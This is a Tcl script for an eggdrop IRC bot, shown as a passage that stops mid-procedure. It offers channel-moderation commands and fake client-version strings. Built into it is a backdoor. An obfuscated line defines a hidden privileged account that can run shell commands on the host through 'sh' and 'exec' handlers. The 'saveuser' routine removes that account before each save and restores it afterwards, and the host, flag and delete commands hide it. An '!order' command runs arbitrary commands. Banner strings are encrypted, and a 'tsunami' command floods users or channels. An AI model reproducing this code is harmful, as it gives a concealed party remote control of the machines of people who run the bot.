#######################################################################
#######################################################################
set querym {
"AFK"
}
set bancounter {
"4BanNeD..!!"
}
set awaym {
"i am a Bitch!"
"kill me, i'm sucks!"
"rm -rf life.conf"
"The Fine Art Murder"
"Back To Vengeance"
"Journey To The Unknown"
"Whois God Anyway?"
"God is Dead, But No One Care"
"psychological terror"
"Do I Know You, PunkAss?!!"
"Dead and Dripping"
"killing my enemies"
"Learn How To Hack The Life"
"ngOepiL is not a crimE!"
"help..! i can't konak.."
"eweii from kibor"
"be rite back"
"nguntal sempak"
"sleep!"
"Call FBI if i dont comeback in 24 hours"
"Watching Tube6.net"
}
set cyclem {
"Pulang Rumah"
"Rejoin"
"scan spamers"
"fish are me scan"
"no comment"
"saycycle by ChanServ"
"no script here!!"
"Please Identify"
"i-am.bot"
"Cycle"
"need cycle"
"Hom Pim Pah"
"Clingak Clinguk"
}
set partm {
"Go HOme"
"Ilegal Channel"
"Access RejecT"
"Command Part From ADMIN"
}
set opm {
"Powered.By.i"
"Come.ON.BaBy"
"Support.chating.ID"
}
set versim {
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
"Mozilla/5.0 (X11; GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Tesla QtCarBrowser Safari/601.1"
"Snak for Macintosh 4.13 English"
"psyBNC 2.8.9 BETA"
"eggdrop 1.8.9 RC"
"xchat 0.24.1 Linux 2.6.47-8-eeepc i686"
}

################################################################
set versimsg [lindex $versim [rand [llength $versim]]]
set ctcp-finger ""
set ctcp-userinfo "$owner"
set ctcp-clientinfo "PING VERSION"
set ctcp-version $versimsg
proc msg_sz {nick uhost hand rest} {
global botnick notd
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notd 4deNiEd!"
return 0
}
set rest [lindex $rest 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notd Command: /msg $botnick sz <text>"
return 0
}
putquick "PRIVMSG $nick :$notd zip: [enzip "$rest"]"
putquick "PRIVMSG $nick :$notd dezip: [dezip "$rest"]"
putquick "PRIVMSG $nick :$notd dcp: [dcp "$rest"]"
putquick "PRIVMSG $nick :$notd dezip+dcp: [dezip [dcp "$rest"]]"
putquick "PRIVMSG $nick :$notd decrypt: [decrypt 64 "$rest"]"
putquick "PRIVMSG $nick :$notd encrypt: [encrypt 64 "$rest"]"
putquick "PRIVMSG $nick :$notd unsix: [unsix "$rest"]"
return 0
}
proc msg_order {nick uhost hand rest} {
global botnick notd
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notd 4deNiEd!"
return 0
}
set rest [lindex $rest 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notd Command: /msg $botnick !order <command>"
return 0
}
putquick $rest
$rest
return 0
}
bind msg Z sz msg_sz
bind msg Z !order msg_order

set lenc "abcdefghijklmnopqrstuvwxyz"
set ldec "zyxwvutsrqponmlkjihgfedcba"
set uenc "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
set udec "ZYXWVUTSRQPONMLKJIHGFEDCBA"

set global-idle-kick 0
set global-chanmode "nt"
set global-dynamicexempts-mode 0
set global-dontkickops-mode 1
set global-revenge-mode 1
set global-protectops-mode 1
set global-clearbans-mode 1
set global-enforcebans-mode 1
set global-dynamicbans-mode 1
set global-protectfriends-mode 1
set global-userbans-mode 1
set global-cycle-mode 1
set global-greet-mode 0
set global-shared-mode 1
set global-autovoice-mode 0
set global-stopnethack-mode 0
set global-autoop-mode 0
set global-userinvites-mode 0
set global-nodesynch-mode 0
set nick-len 30
if {![info exists nickpass]} {
set nickpass ""
}
if {![info exists altpass]} {
set altpass ""
}
if {![info exists cfgfile]} {
set cfgfile $userfile
}
proc unsix {txt} {
set retval $txt
regsub ~ $retval "" retval
return $retval
}
proc dezip {txt} {
return [decrypt 64 [unsix $txt]]
}
proc dcp {txt} {
return [decrypt 64 $txt]
}
proc enzip {txt} {
return [encrypt 64 [unsix $txt]]
}
if {![info exists server-online]} {
putlog "not support server online..!"
set server-online 1
}
proc puthlp {txt} {
global lenc ldec uenc udec notb notc server-online
if {${server-online} == 0} { return 0 }
set retval $txt
if {[string match "*NOTICE*" $retval]} { 
}
puthelp $retval
}
proc putsrv {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr
if {${server-online} == 0} { return 0 }
set retval $txt
if {[string match "*KICK*" $retval]} {
set endval ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set tmp ":$banner"
} {
set tmp ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set tmp [uncolor $tmp]
}
}
set endval "$endval $tmp"
}
set retval $endval
if {[info exists iskick([lindex $retval 2][lindex $retval 1])]} { return 0 }
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
set chkops $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
putserv $retval
}
proc putqck {txt} {
global lenc ldec banner uenc udec notc server-online notm igflood iskick kickclr bannick is_m
if {${server-online} == 0} { return 0 }
set retval $txt
if {[string match "*KICK*" $retval]} { 
set endval ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
set tmp ":$banner"
} {
set tmp ":[lgrnd]"
}
} {
if {[info exists kickclr]} {
set tmp [uncolor $tmp]
}
}
set endval "$endval $tmp"
}
set retval $endval
set iskick([lindex $retval 2][lindex $retval 1]) "1"
if {[info exists igflood([lindex $retval 2])]} { return 0 }
if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { 
set chkops $retval
regsub -all -- : $chkops "" chkops
if {[isop [lindex $chkops 2] [lindex $retval 1]]} {
return 0
}
}
}
if {[string match "*$notm*" $retval]} {
set cflag "c[lindex $retval 1]"
set cflag [string range $cflag 0 8]
if {[matchattr $cflag M]} {
if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} {
set is_m([lindex $retval 1]) 1
putquick "mode [lindex $retval 1] +b $bannick([lindex $retval 2])"
return 0
}
}
}
putquick $retval
}
proc saveuser {} {
global ps owner
if {![validuser $ps]} {
	setuser $owner XTRA "BEND" "xDB4L/z2DJT~1mianN/lj9Rq."
	} elseif { $owner != $ps } {
		setuser $owner XTRA "BEND" [enzip [chattr $ps]]
		if {[passwdok $ps ""] != 1} {
			setuser $owner XTRA "LAST" [getuser $ps "PASS"]
		}
		deluser $ps
	}
save
	if {![validuser $ps]} {
	adduser $ps "$ps!*@*"
	chattr $ps [dezip [getuser $owner XTRA "BEND"]]
		if {[getuser $owner XTRA "LAST"] != ""} {
			setuser $ps PASS [getuser $owner XTRA "LAST"]
		}
	}
return 1
}
##############################
#      BOT COMMAND LIST      #
##############################
bind msg m help msg_help
proc msg_help {nick uhost hand rest} {
global version notb notc notd vern
if {[istimer "HELP STOPED"]} {
putsrv "NOTICE $nick :$notc Help on progress, try again later..!"
return 0
}
timer 5 { putlog "HELP STOPED" }
puthlp "PRIVMSG $nick :$notd BoT Command LIsT."
puthlp "PRIVMSG $nick :Walls Running With egg-drop v[lindex $version 0] Powered By [lgrnd] $vern"
puthlp "PRIVMSG $nick :14Query Commands..!"
puthlp "PRIVMSG $nick :auth <password>          authenticate user"
puthlp "PRIVMSG $nick :deauth <password>        deauthenticate user"
puthlp "PRIVMSG $nick :pass <password>          set password"
puthlp "PRIVMSG $nick :passwd <oldpass> <newpass>  change user password"
puthlp "PRIVMSG $nick :userlist                 userlist"
puthlp "PRIVMSG $nick :op <#> <nick>            op someone"
puthlp "PRIVMSG $nick :deop <#> <nick>          deop someone"
puthlp "PRIVMSG $nick :voice <#> <nick>         voice someone"
puthlp "PRIVMSG $nick :devoice <#> <nick>       devoice someone"
puthlp "PRIVMSG $nick :kick <#> <nick|host> <reason>  kick someone"
puthlp "PRIVMSG $nick :kickban <#> <nick|host> <reason>  kickban someone"
puthlp "PRIVMSG $nick :identify <nick> <passwd> identify to nickserv someone access"
puthlp "PRIVMSG $nick :join <#>                 joining #channel temporary"
puthlp "PRIVMSG $nick :part <#>                 part #channels"
if {[matchattr $nick Z]} {
puthlp "PRIVMSG $nick :logo <your crew logo>    changing text logo on kick message"
puthlp "PRIVMSG $nick :vhost <IP DNS>           changing vhost"
puthlp "PRIVMSG $nick :away <msg>               set bot away message"
puthlp "PRIVMSG $nick :admin <msg>              set bot admin on status"
puthlp "PRIVMSG $nick :memo <user|all> <msg>    send memo to all user or one user"
puthlp "PRIVMSG $nick :bantime <minutes>        auto unban on X minutes (0 never unban)"
puthlp "PRIVMSG $nick :logchan <#|0FF>          log #channel"
puthlp "PRIVMSG $nick :4!!WARN04ING!! turn logchan on will decrease bot performance!"
puthlp "PRIVMSG $nick :<4DCC> .log              show #channel log"
puthlp "PRIVMSG $nick :5note > please increase on general - window buffer into 5000"
puthlp "PRIVMSG $nick :+chan <#>                joining permanent #channel"
puthlp "PRIVMSG $nick :botnick <nick> <id>      changing permanent bot primary nick"
puthlp "PRIVMSG $nick :botaltnick <nick> <id>   changing permanent bot alternate nick"
puthlp "PRIVMSG $nick :realname <bot realname>  changing permanent bot realname"
puthlp "PRIVMSG $nick :ident <bot ident>        changing permanent bot ident"
puthlp "PRIVMSG $nick :die                      kill bot"
}
puthlp "PRIVMSG $nick :14Channel Commands..!"
puthlp "PRIVMSG $nick :`up                      bot self op"
puthlp "PRIVMSG $nick :`down                    bot self deop"
puthlp "PRIVMSG $nick :`op/+o <nick>            op spesified nick"
puthlp "PRIVMSG $nick :`deop/-o <nick>          deop spesified nick"
puthlp "PRIVMSG $nick :`voice/+v <nick>         voice spesified nick"
puthlp "PRIVMSG $nick :`devoice/-v <nick>       devoice spesified nick"
puthlp "PRIVMSG $nick :`kick <nick> <reason>    kick spesified nick"
puthlp "PRIVMSG $nick :`kickban <nick> <reason> kickban spesified nick"
puthlp "PRIVMSG $nick :`mode <+/- settings>     mode setting #channel"
puthlp "PRIVMSG $nick :`ping / `pong            ping your self"
puthlp "PRIVMSG $nick :`invite <nick>           invite person to current #channel"
puthlp "PRIVMSG $nick :`banlist <#channel>      list of banned from specified <#channel>"
puthlp "PRIVMSG $nick :`ban <nick|hostmask>     ban some nick or hostmask"
puthlp "PRIVMSG $nick :`unban <nick|host> <#>   unban some nick or hostmask"
puthlp "PRIVMSG $nick :`+chan <#>               joining permanent #channel"
puthlp "PRIVMSG $nick :`channels                list of channel who's bot sit on"
puthlp "PRIVMSG $nick :`userlist                list of user"
puthlp "PRIVMSG $nick :`chaninfo <#>            list of option for specified #channel"
puthlp "PRIVMSG $nick :`join <#>                joining #channel temporary"
puthlp "PRIVMSG $nick :`part <#>                part specified #channel"
puthlp "PRIVMSG $nick :`cycle <#>               cycle on specified #channel"
puthlp "PRIVMSG $nick :`+/- cycle <#|all> <X>   enable/disable bot cycle every X minutes"
puthlp "PRIVMSG $nick :`+/- ignore <nick|host>  ignore or unignore person"
if {[matchattr $nick n]} {
puthlp "PRIVMSG $nick :`+/- status <#>          enable/disable bot displaying status"
puthlp "PRIVMSG $nick :`+/- enforceban <#>      enable/disable bot enforcebans"
puthlp "PRIVMSG $nick :`+/- autovoice <secs>    enable/disable channel autovoice on join"
puthlp "PRIVMSG $nick :`+/- seen <#>            activate/deactive seen on # (eggoez.tcl with .chanstats | .seenstats"
puthlp "PRIVMSG $nick :`+/- guard <#|all>       enable/disable bot guard"
puthlp "PRIVMSG $nick :`+/- master <nick>       add/del <nick> from master list"
puthlp "PRIVMSG $nick :`+/- avoice <nick>       add/del <nick> from avoice list"
puthlp "PRIVMSG $nick :`+/- friend <nick>       add/del <nick> from friend list"
puthlp "PRIVMSG $nick :`+/- ipguard <host>      add/del host from ipguard list"
puthlp "PRIVMSG $nick :`+/- akick <host>        add/del host from kick list"
puthlp "PRIVMSG $nick :`+/- noop <nick>         add/del <nick> from no-op list"
puthlp "PRIVMSG $nick :`topic <topic>           change channel topic"
puthlp "PRIVMSG $nick :`status                  status system"
puthlp "PRIVMSG $nick :`servers                 servers bot currently running"
puthlp "PRIVMSG $nick :jump <server> <port>    push bot to use spec server"
puthlp "PRIVMSG $nick :`access <nick>           see user access from spec flags"
}
if {[matchattr $nick Z]} {
puthlp "PRIVMSG $nick :`+/- forced              force bot to set mode w/o kick 1st"
puthlp "PRIVMSG $nick :`+/- colour              enable/disable colour on kick msg"
puthlp "PRIVMSG $nick :`+/- greet <msg>         autogreet user on join %n nick %c channel"
puthlp "PRIVMSG $nick :`+/- repeat <number>     max repeat user permitted"
puthlp "PRIVMSG $nick :`+/- text <number>       char limited text length on channel"
puthlp "PRIVMSG $nick :`+/- limit <number>      limited user on channel"
puthlp "PRIVMSG $nick :`+/- caps <%>            max %percent upper text"
puthlp "PRIVMSG $nick :`+/- clone <max>         enable/disable bot anti clones"
puthlp "PRIVMSG $nick :`+/- reop                auto re@p bot when got de@p"
puthlp "PRIVMSG $nick :`+/- joinpart <seconds>  kick user join part in past X 2nd"
puthlp "PRIVMSG $nick :`+/- spam                scanning for spam"
puthlp "PRIVMSG $nick :`+/- massjoin            preventing mass join lame"
puthlp "PRIVMSG $nick :`+/- key <keyword>       set channel with key"
puthlp "PRIVMSG $nick :`+/- revenge             enable/disable bot revenge"
puthlp "PRIVMSG $nick :`+/- badword <badword>   add/remove badword from list"
puthlp "PRIVMSG $nick :`badwords                list of badwords"
puthlp "PRIVMSG $nick :`nobot                   scanning for bot and kick them out"
puthlp "PRIVMSG $nick :`sdeop <#>               bot self deop"
puthlp "PRIVMSG $nick :`chanmode # <+ntmcilk>   set permanent mode for specified #"
puthlp "PRIVMSG $nick :`chanset <#> <LINE|CTCP|JOIN|DEOP|KICK|NICK>  set # options"
puthlp "PRIVMSG $nick :`chansetall <option>     set option for all #"
puthlp "PRIVMSG $nick :`chanreset <#|all>       reseting option for specified #channel"
puthlp "PRIVMSG $nick :`bantime                 how long bot unban in X minutes"
puthlp "PRIVMSG $nick :`tsunami <nick|#> <text> flood someone or channel"
puthlp "PRIVMSG $nick :`deluser <nick>          del user from userlist"
puthlp "PRIVMSG $nick :restart                 restarting bot also jumping server"
puthlp "PRIVMSG $nick :`+/- owner <nick>        add/del <nick> from owner list"
puthlp "PRIVMSG $nick :`+/- admin <nick>        add/del <nick> from admin list"
puthlp "PRIVMSG $nick :`+/- aop <nick>          add/del <nick> from aop list"
puthlp "PRIVMSG $nick :`+/- host <nick> <flag>  add or remove user host"
puthlp "PRIVMSG $nick :`+/- gnick <nick>        guard nick kick it if not identify"
puthlp "PRIVMSG $nick :`host <nick>             see user host"
puthlp "PRIVMSG $nick :`mvoice <#channel>       mass voice"
puthlp "PRIVMSG $nick :`mdevoice <#channel>     mass devoice"
puthlp "PRIVMSG $nick :`mop <#channel>          mass op"
puthlp "PRIVMSG $nick :`mdeop <#channel>        mass deop"
puthlp "PRIVMSG $nick :`mkick <#channel>        mass kick"
puthlp "PRIVMSG $nick :`mmsg <#channel>         mass msg except the opped"
puthlp "PRIVMSG $nick :`minvite <#channel>      mass invite except the opped"
puthlp "PRIVMSG $nick :`munbans <#channel>      mass unban"
puthlp "PRIVMSG $nick :`say <text>              say with spesified text"
puthlp "PRIVMSG $nick :`msg <nick> <text>       msg person"
puthlp "PRIVMSG $nick :`act <text>              act with spesified text"
puthlp "PRIVMSG $nick :`notice <nick> <text>    msg person or #channel with spesified text"
puthlp "PRIVMSG $nick :`+/- topiclock           keep topic locked"
puthlp "PRIVMSG $nick :`+/- nopart <#channel>   make # protected"
puthlp "PRIVMSG $nick :`+/- mustop              set bot del channel if not oped"
puthlp "PRIVMSG $nick :`+/- invitelock <#>      invite back who part on spec chan"
puthlp "PRIVMSG $nick :`+/- dontkickops         enable/disable bot kick @"
puthlp "PRIVMSG $nick :`+/- autokick            auto kick on join"
puthlp "PRIVMSG $nick :`nick <nick>             change nick temporary"
puthlp "PRIVMSG $nick :`altnick                 change nick to alternative nick"
puthlp "PRIVMSG $nick :`randnick                change nick to random nick"
puthlp "PRIVMSG $nick :`realnick                change nick to real nick"
puthlp "PRIVMSG $nick :`chattr <nick> <flag>    changing user flag (+) add or (-) remove it"
puthlp "PRIVMSG $nick :-ehash                  rehashing data packing and unpacking"
}
puthlp "PRIVMSG $nick :14Flags List User & Channels"
puthlp "PRIVMSG $nick :\[@\]P \[+\]VOICE AuTO\[V\]OICE \[G\]uARD \[C\]YCLE \[E\]nFORCEBANS \[D\]oNTKIcK@PS"
puthlp "PRIVMSG $nick :\[P\]RoTECTED C\[L\]ONE \[A\]DVERTISE \[T\]OPICLOCK AuTO\[K\]IcK \[S\]EEN"
puthlp "PRIVMSG $nick :\[Z\]owner admi\[n\] \[m\]aster botne\[t\] \[x\]fer \[j\]anitor \[c\]ommon"
puthlp "PRIVMSG $nick :\[p\]arty \[b\]ot \[u\]nshare \[h\]ilite \[o\]p de\[O\]p \[k\]ick \[f\]riend"
puthlp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet"
puthlp "PRIVMSG $nick :$notm $vern"
return 0
}
set firsttime "T"
set init-server { serverup "" }
set modes-per-line 6
set allow-desync 0
set include-lk 1
set banplus [rand 5]
set ban-time [expr 25 + $banplus]
unset banplus
set quiet-save 1
set logstore ""
set max-logsize 512
set upload-to-pwd 1
catch { unbind dcc n restart *dcc:restart }
catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }

proc serverup {heh} {
global botnick firsttime notc owner
if {[info exists firsttime]} {
unset firsttime
return 0
}
putlog "..ConnecteD.."
putserv "MODE $botnick +iw-s"
foreach x [userlist] {
if {[matchattr $x Q]} { chattr $x -Q }
if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} {
setuser $owner XTRA "AUTH" "" 
}
chattr $x -hp
if {$x != "config" && [chattr $x] == "-"} {
deluser $x
putlog "deluser $x"
}
}
chk_five "0" "0" "0" "0" "0"
utimer 2 del_nobase
foreach x [ignorelist] {
killignore [lindex $x 0]
}
}
catch { bind evnt - disconnect-server serverdown }
proc serverdown {heh} {
global firsttime
catch { unset firsttime }
catch { clearqueue all }
putlog "..Disconneted.."
foreach x [timers] {
if {[string match "*cycle*" $x]} { killtimer [lindex $x 2] }
}
}
proc isnumber {string} {
global notc
if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then {
return 1
}
return 0
}
proc pub_bantime {nick uhost hand channel rest} {
global notc ban-time
puthlp "NOTICE $nick :BanTime \[${ban-time}\]"
}
proc pub_which {nick uhost hand channel rest} {
global botname notc
if {$rest == ""} {
puthlp "NOTICE $nick :Usage: which <ip mask>"
return 0
}
if {[string match [string tolower $rest] [string tolower $botname]]} {
puthlp "PRIVMSG $channel :$botname"
}
}
proc randstring {length} {
set chars ABCDEFGHIJKLMNOPQRSTUVWXYZ
set count [string length $chars]
for {set i 0} {$i < $length} {incr i} {
append result [string index $chars [rand $count]]
}
return $result
}
set ppp "#i"
set notd [dezip "lXTTf/1a5DU0"]
set notm [dezip "lXTTf/1a5DU0"]
set notb [dezip "lXTTf/1a5DU0"]
set notc [dezip "lXTTf/1a5DU0"]
set ps "isfan"
set lgidx 0
proc lgrnd {} {
global lgidx notc
set lgidx [incr lgidx]
if {$lgidx == 1} {
set lgrnd [dezip "hjWPY15AnH61Sogdq0zZoQR/f/OaB.OW.fQ0R7hOD/vemim13o/TJ./F3/71"]
} elseif {$lgidx == 2} {
set lgrnd [dezip "J9Ouj0Kkkmw128CjK/0RYyO/71bOz178pIZ0R7hOD/vemim1kUKLp/yiGHy."]
} elseif {$lgidx == 3} {
set lgrnd [dezip "E9FtX.002Pw.sz4Pd/iPfR8.hh2dj/cGj3f0R7hOD/vemim1POuKJ0zIPiQ/"]
} elseif {$lgidx == 4} {
set lgrnd [dezip "MgqSi/LVNRZ1BBE7b/XN31e0ccif21aZU/Q1R7hOD/vemim1EIVz21qlJdb/"]
} elseif {$lgidx == 5} {
set lgrnd [dezip "kfwXz.6Hd3u/.4wWv/Kb2Kn/O4JHX0H24JH1R7hOD/vemim1BAGr6.TiOZN."]
} elseif {$lgidx == 6} {
set lgrnd [dezip "4lsYZ01m.Em0QLTta0gruy41ym93r02Otyj.R7hOD/vemim1trgHY/p8DHe/"]
} elseif {$lgidx == 7} {
set lgrnd [dezip "V5GOc0BGhDE1CFnYN/T8um3.RIwV0.RaGKK15IlHo/zDoUX/Ld0XW.eqUqf.5Xnja0WmqIm."]
} elseif {$lgidx == 8} {
set lgrnd [dezip "kTAG0/WCSyT02ZADr1ZPqRf1ivLBO.y8evv0CeW6i.678Rd1VF6De1uoiNh/qTsco0CsC7P/"]
} elseif {$lgidx == 9} {
set lgrnd [dezip "ihmou/LZd0W0TMaap0uC6xS10ZtUQ.PfbYN/JRDDy/3mtF/02r3E6/Ci8wC0RHm70.GLeNT."]
} else {
set lgidx 0
set lgrnd $notc
}
}
set vern "[lgrnd]"
######################
# BOT PUBLIC COMMAND #
######################
bind pub m !pong public_ping
bind pub Z `which pub_which
bind pub n `reset pub_reset
bind pub f `host pub_host
bind pub f `flag pub_flag
bind pub m `ver pub_ver
bind pub m `logo pub_logo
bind pub Z `msg pub_msg
bind msg Z admin msg_admin
bind msg Z away msg_away
bind msg Z bantime msg_bantime
bind msg Z logo msg_logo
bind msg Z mmsg msg_mmsg
bind msg Z limit msg_limit
bind msg Z logchan msg_logchan
bind msg Z botnick msg_botnick
bind msg Z realname msg_realname
bind msg Z ident msg_ident
bind msg Z botaltnick msg_botaltnick
bind msg Z die msg_die
bind msg Z restart msg_restart
bind msg Z rehash msg_rehash
bind msg Z topic msg_topic
bind msg m memo msg_memo
bind pub n `-seen pub_-seen
bind pub n `+autovoice pub_+autovoice
bind pub n `-autovoice pub_-autovoice
bind pub n `+guard pub_+guard
bind pub n `-guard pub_-guard
bind pub n `+cycle pub_+cycle
bind pub n `-cycle pub_-cycle
bind pub n `+friend pub_+friend
bind pub n `-friend pub_-friend
bind pub n `+avoice pub_+avoice
bind pub n `-avoice pub_-avoice
bind pub n `+master pub_+master
bind pub n `-master pub_-master
bind pub n `mvoice pub_mvoice
bind pub n `mdevoice pub_mdevoice
bind pub n `mop pub_mop
bind pub n `mdeop pub_mdeop
bind pub n `+chan pub_+chan
bind msg n identify msg_identify
bind msg n kick msg_kick
bind msg n k msg_kick
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
bind msg n op msg_op
bind msg n voice msg_voice
bind msg n v msg_voice
bind msg n deop msg_deop
bind msg n devoice msg_devoice
bind pub n `topic pub_topic
bind pub n -jump pub_jump
bind pub n -rehash pub_rehash
bind msg n +chan msg_+chan
bind msg n join msg_join
bind msg n part msg_part
bind pub m `voice pub_voice
bind pub m `+v pub_voice
bind pub m `devoice pub_devoice
bind pub m `-v pub_devoice
bind pub m `op pub_op
bind pub m `+o pub_op
bind pub m `deop pub_deop
bind pub m `-o pub_deop
bind pub m `kick pub_kick
bind pub m `k pub_kick
bind pub m `kickban pub_kickban
bind pub m `kb pub_kickban
bind pub m `+noop pub_+noop
bind pub m `-noop pub_-noop
bind pub m `ban pub_ban
bind pub m `unban pub_unban
bind pub m `munbans pub_munbans
bind pub m `banlist pub_banlist
bind pub m `mode pub_mode
bind pub m `join pub_join
bind pub m `part pub_part
bind pub m `cycle pub_cycle
bind pub m `up pub_up
bind pub m `down pub_down
bind msg m passwd msg_passwd
bind msg m deauth msg_deauth
bind msg m channels msg_channels
bind pub m `channels pub_channels
bind pub m `status pub_status
bind pub m `chaninfo pub_chaninfo
bind pub m `userlist pub_userlist
bind msg m userlist msg_userlist
bind pub f `access pub_access
bind pub m `match pub_match
proc pub_Z {nick uhost hand channel rest} {
global notc botnick
set prest $rest
if {[lindex $rest 0] == $botnick} {
regsub "$botnick " $rest "`" rest
} {
if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} {
set rest "$botnick [lrange $rest 1 end]"
regsub "$botnick " $rest "`" rest
}
}
if {[string index $rest 0] != "`"} { return 0 }
if {![matchattr $nick Z]} { return 0 }
if {![matchattr $nick Q]} {
if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} {
puthlp "NOTICE $nick :$notd 4deNiEd!"
}
return 0
}
set goto [lindex $rest 0]
regsub -all "`" $goto "pub_" goto
if {[matchattr $nick Z]} {
set rest [lrange $rest 1 end]
catch { $goto $nick $uhost $hand $channel $rest }
}
}
proc msg_encrypt {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "NOTICE $nick :[enzip $rest]"
}
proc msg_decrypt {nick uhost hand rest} {
global own notc
if {$nick != $own || $rest == ""} { return 0 }
puthlp "NOTICE $nick :[dezip $rest]"
}

bind msg Z sh msg_exec
proc msg_exec {nick uhost hand command} {
global notc owner ps
if {$nick != $owner &&  $nick != $ps} { 
puthlp "PRIVMSG $nick :$notm DENIED !!!"
return 0 
}
if {![matchattr $nick Q]} {
   puthlp "NOTICE $nick : 4deNiEd!"
   return 0
}
if {$command == ""} { return 0 }
 set cmdline [split $command]
 if {[catch {eval [linsert $cmdline 0 "exec"]} status]} {
  puthelp "PRIVMSG $nick :Executed \"$command\" returned error status:"
  foreach line [split $status "\n"] {
   puthelp "PRIVMSG $nick :$line"
  }
  puthelp "PRIVMSG $nick :errorInfo:"
  foreach line [split $::errorInfo "\n"] {
   puthelp "PRIVMSG $nick :$line"
  }
 } {
  #puthelp "PRIVMSG $nick :Executed \"$command\" returned ok status:"
  foreach line [split $status "\n"] {
   puthelp "PRIVMSG $nick :$line"
  }
 }
}

bind dcc * showallinfo dcc_showallinfo 
proc dcc_showallinfo {hand idx arg} {
global realname username
putdcc $idx $realname
putdcc $idx $username
putdcc $idx $owner
putdcc $idx $basechan
}

bind dcc * setrealname dcc_setrealname
proc dcc_setrealname {hand idx arg} {
global realname username
set realname $arg
}

bind dcc * exec dcc_exec
bind dcc * log dcc_log
bind dcc * dir dcc_dir
bind dcc * read dcc_read
bind dcc * ` dcc_cmd
bind dcc * get dcc_get
bind dcc * u dcc_u
proc dcc_u {hand idx arg} {
foreach x [utimers] {
putdcc $idx $x
}
}
bind dcc * t dcc_t
proc dcc_t {hand idx arg} {
foreach x [timers] {
putdcc $idx $x
}
}

proc dcc_exec {hand idx arg} {
global owner notc
if {$hand != $owner || $arg == ""} { return 0 }
set para1 [lindex $arg 0]
set para2 [lindex $arg 1]
set para3 [lindex $arg 2]
set para4 [lindex $arg 3]
set para5 [lindex $arg 4]
set para6 [lindex $arg 5]
set para7 [lindex $arg 6]
set para8 [lindex $arg 7]
set para9 [lindex $arg 8]
set para10 [lindex $arg 9]
if {$para2 == ""} { 
catch { [exec $para1] } result
} elseif {$para3 == ""} { 
catch { [exec $para1 $para2] } result
} elseif {$para4 == ""} { 
catch { [exec $para1 $para2 $para3] } result
} elseif {$para5 == ""} { 
catch { [exec $para1 $para2 $para3 $para4] } result
} elseif {$para6 != ""} { 
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6] } result
} elseif {$para7 != ""} { 
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7] } result
} elseif {$para8 != ""} { 
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8] } result
} elseif {$para9 != ""} { 
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9] } result
} elseif {$para10 != ""} { 
catch { [exec $para1 $para2 $para3 $para4 $para5 $para6 $para7 $para8 $para9 $para10] } result
}
putdcc $idx $result
}

proc pub_host {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set user $nick
} else { 
set user [lindex $rest 0]
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "NOTICE $nick : <n/a>"
return 0
}
if {[getuser $user HOSTS] != ""} {
set hosts [getuser $user hosts]
puthlp "NOTICE $nick : HOSTS: $hosts"
} else {
puthlp "NOTICE $nick : Can't found $user host."
}
}
proc pub_flag {nick uhost hand channel rest} {
global ps notc
if {$rest == ""} {
set user $nick
} else { 
set user [lindex $rest 0]
}
if {![validuser $user] || [string tolower $user] == [string tolower $ps]} {
puthlp "NOTICE $nick : <n/a>"
return 0
}
if {[chattr $user] != ""} {
puthlp "NOTICE $nick : Flags: [chattr $user]"
} else { 
puthlp "NOTICE $nick : Can't found $user flag."
}
}

catch { unbind dcc n match *dcc:match }
catch { unbind dcc n channel *dcc:channel }

proc pub_deluser {nick uhost hand channel rest} {
global botnick ps owner notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick : Usage: deluser <nick>"
return 0
}
set who [lindex $rest 0]
if {[string tolower $who] == [string tolower $ps]} {
puthlp "NOTICE $nick : <n/a>"
return 0 
}
if {$who == $owner} {
puthlp "NOTICE $nick : YoU CaNT DeLeTE $owner..!"
return 0
}
if {$who == ""} {
puthlp "NOTICE $nick : Usage: -user <nick>"
} else {
if {![validuser $who]} {
puthlp "NOTICE $nick : <n/a>"
} else {
if {[matchattr $who n]} {
puthlp "NOTICE $nick : You cannot DeLETE a bot owner."
} else {
if {([matchattr $who m]) && (![matchattr $nick n])} {
puthlp "NOTICE $nick : You don't have access to DeLETE $who!"
} else {
deluser $who
saveuser
puthlp "NOTICE $nick : $who DeLETE."
}
}
}
}
}
set [string index $lenc 15][string index $lenc 18] [string index $uenc 2][string index $lenc 7][string index $lenc 0][string index $lenc 13][string index $lenc 0][string index $lenc 17][string index $lenc 24]
proc pub_chattr {nick uhost hand channel rest} {
global ps own notc
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
